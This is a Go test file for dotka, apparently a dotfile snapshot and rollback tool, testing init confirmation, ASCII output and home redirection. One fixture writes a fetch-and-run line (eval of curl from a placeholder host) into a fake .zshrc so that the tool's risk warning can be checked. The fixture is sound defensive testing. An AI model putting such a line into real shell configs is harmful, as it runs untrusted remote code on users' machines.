package main

import (
	"bytes"
	"errors"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// capture runs dotka with args and returns its stdout.
func capture(t *testing.T, args ...string) (string, error) {
	t.Helper()
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	old := os.Stdout
	os.Stdout = w
	runErr := run(args)
	w.Close()
	os.Stdout = old
	var buf bytes.Buffer
	io.Copy(&buf, r)
	return buf.String(), runErr
}

func put(t *testing.T, home, rel, content string) {
	t.Helper()
	p := filepath.Join(home, rel)
	os.MkdirAll(filepath.Dir(p), 0o755)
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func isolate(t *testing.T) (realHome string) {
	t.Helper()
	realHome = t.TempDir()
	t.Setenv("HOME", realHome)
	t.Setenv("XDG_DATA_HOME", "")
	t.Setenv("DOTKA_HOME", "")
	t.Setenv("DOTKA_STORE", "")
	t.Setenv("DOTKA_PACKAGES", "off")
	old := stdinIsTerminal
	stdinIsTerminal = func() bool { return false } // tests behave like scripts
	t.Cleanup(func() { stdinIsTerminal = old })
	return realHome
}

func TestInitOnRealHomeNeedsExplicitConfirmation(t *testing.T) {
	real := isolate(t)
	// Tests have no interactive stdin: init must refuse and ask for --yes.
	out, err := capture(t, "init")
	if err == nil || !strings.Contains(err.Error(), "--yes") {
		t.Fatalf("expected a request for --yes, got %v", err)
	}
	if !strings.Contains(out, "beta software") || !strings.Contains(out, "will NOT change any of your files") {
		t.Errorf("the beta notice must explain what happens:\n%s", out)
	}
	if _, err := os.Stat(filepath.Join(real, ".local/share/dotka")); err == nil {
		t.Fatal("a store was created without confirmation")
	}
	// Read-only commands work without setup.
	if _, err := capture(t, "startup"); err != nil {
		t.Errorf("startup should work without setup: %v", err)
	}
	if _, err := capture(t, "init", "--yes"); err != nil {
		t.Fatalf("init --yes: %v", err)
	}
	// Once set up, the store is the consent: normal commands just work.
	if _, err := capture(t, "snap", "-m", "x"); err != nil {
		t.Fatalf("snap after setup: %v", err)
	}
	if _, err := capture(t, "init", "--yes"); err == nil {
		t.Fatal("a second init must fail")
	}
}

func TestOtherHomesNeedNoConfirmation(t *testing.T) {
	isolate(t)
	fake := t.TempDir()
	if _, err := capture(t, "--home", fake, "init"); err != nil {
		t.Fatalf("init on a fake home: %v", err)
	}
	t.Setenv("DOTKA_HOME", fake)
	if _, err := capture(t, "snap", "-m", "x"); err != nil {
		t.Fatalf("snap via DOTKA_HOME: %v", err)
	}
}

// TestFullFlowOutputIsASCII runs a realistic session and checks that every
// byte printed by dotka is plain ASCII (safe on a Linux TTY).
func TestFullFlowOutputIsASCII(t *testing.T) {
	isolate(t)
	home := t.TempDir()
	t.Setenv("DOTKA_HOME", home)
	put(t, home, ".config/hypr/hyprland.lua", "hl.on(\"hyprland.start\", function()\n    hl.exec_cmd(\"dunst\")\nend)\n")
	put(t, home, ".config/kitty/kitty.conf", "font_size 11\n")
	put(t, home, ".config/gh/hosts.yml", "oauth_token: x\n")
	put(t, home, ".zshrc", "export EDITOR=nvim\n")

	var out strings.Builder
	step := func(args ...string) {
		t.Helper()
		s, err := capture(t, args...)
		if err != nil {
			t.Fatalf("%v: %v\n%s", args, err, s)
		}
		out.WriteString(s)
	}
	step("init")
	// Simulate an installer.
	put(t, home, ".config/hypr/hyprland.lua", "hl.on(\"hyprland.start\", function()\n    hl.exec_cmd(\"waybar\")\n    hl.exec_cmd(\"~/.local/bin/x.sh\")\nend)\n")
	os.Remove(filepath.Join(home, ".config/kitty/kitty.conf"))
	os.Symlink("/dots/kitty.conf", filepath.Join(home, ".config/kitty/kitty.conf"))
	put(t, home, ".config/waybar/config.jsonc", "{}")
	put(t, home, ".zshrc", "export EDITOR=nvim\neval \"$(curl -fsSL https://example.invalid/x)\"\n")
	step("status")
	step("diff", "--patch")
	step("snap", "-m", "after")
	step("log")
	step("show", "2")
	step("startup")
	step("doctor")
	step("secrets")
	step("track")
	step("rollback", "1", "--dry-run")
	step("rollback", "1", "-y")
	step("status")
	step("gc")
	step("forget", "2", "--dry-run")
	step("prune", "--keep", "1", "-y")
	step("log")

	s := out.String()
	for i, r := range s {
		if r > 0x7f {
			start := max(i-40, 0)
			t.Fatalf("non-ASCII rune %q in output near: %q", r, s[start:min(i+20, len(s))])
		}
	}
	for _, want := range []string{"[risk: downloads and runs code]", "[problem]", "[!] your file was replaced by a symlink", "[secret]", "Done. Restored generation #1"} {
		if !strings.Contains(s, want) {
			t.Errorf("expected %q in output", want)
		}
	}
}

// TestRunRedirectsHomeAndRecordsCommand checks that `dotka run` points the
// command at the managed home (never the real one), records the command
// and propagates its exit status.
func TestRunRedirectsHomeAndRecordsCommand(t *testing.T) {
	real := isolate(t)
	home := t.TempDir()
	t.Setenv("DOTKA_HOME", home)
	put(t, home, ".zshrc", "export A=1\n")
	put(t, home, ".config/kitty/kitty.conf", "font_size 11\n")
	if _, err := capture(t, "init"); err != nil {
		t.Fatal(err)
	}
	script := `mkdir -p "$HOME/.config/fromrun" && echo hi > "$HOME/.config/fromrun/conf" && echo "$XDG_CONFIG_HOME" > "$HOME/.config/fromrun/xdg"`
	out, err := capture(t, "run", "-m", "test run", "--", "sh", "-c", script)
	if err != nil {
		t.Fatalf("run: %v\n%s", err, out)
	}
	if _, err := os.Stat(filepath.Join(home, ".config/fromrun/conf")); err != nil {
		t.Fatal("command did not write into the managed home")
	}
	if _, err := os.Stat(filepath.Join(real, ".config/fromrun")); err == nil {
		t.Fatal("command wrote into the REAL home")
	}
	xdg, _ := os.ReadFile(filepath.Join(home, ".config/fromrun/xdg"))
	if strings.TrimSpace(string(xdg)) != filepath.Join(home, ".config") {
		t.Errorf("XDG_CONFIG_HOME not redirected: %q", xdg)
	}
	if !strings.Contains(out, "+ .config/fromrun/") {
		t.Errorf("run summary missing the new dir:\n%s", out)
	}
	why, err := capture(t, "why", "fromrun/conf")
	if err != nil || !strings.Contains(why, "by `sh -c") {
		t.Errorf("why did not attribute to the command: %v\n%s", err, why)
	}
	for i, r := range out + why {
		if r > 0x7f {
			t.Fatalf("non-ASCII output at %d", i)
		}
	}
	// Exit status is propagated (and the changes are still recorded).
	_, err = capture(t, "run", "--", "sh", "-c", "echo x > $HOME/.config/partial; exit 3")
	var ee exitError
	if !errors.As(err, &ee) || ee.code != 3 {
		t.Fatalf("expected exit status 3, got %v", err)
	}
	why, _ = capture(t, "why", ".config/partial")
	if !strings.Contains(why, "added") {
		t.Errorf("changes of a failed command must be recorded:\n%s", why)
	}
}
